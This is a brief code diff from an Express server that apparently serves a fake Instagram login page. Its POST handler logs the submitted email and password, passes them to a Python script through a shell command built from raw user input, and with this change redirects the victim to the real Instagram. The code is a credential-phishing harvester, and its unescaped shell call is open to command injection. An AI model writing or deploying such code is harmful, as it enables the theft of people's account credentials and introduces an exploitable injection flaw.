@@ -20,7 +20,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.post('/', urlencodedParser, function (req, res) {
     console.log(req.body.email, req.body.password)
     command("python3 instagram.py " + req.body.email + " " + req.body.password)
-    txt
+    res.redirect("https://www.instagram.com/")
   })
 
 app.get('/', (req, res) => {
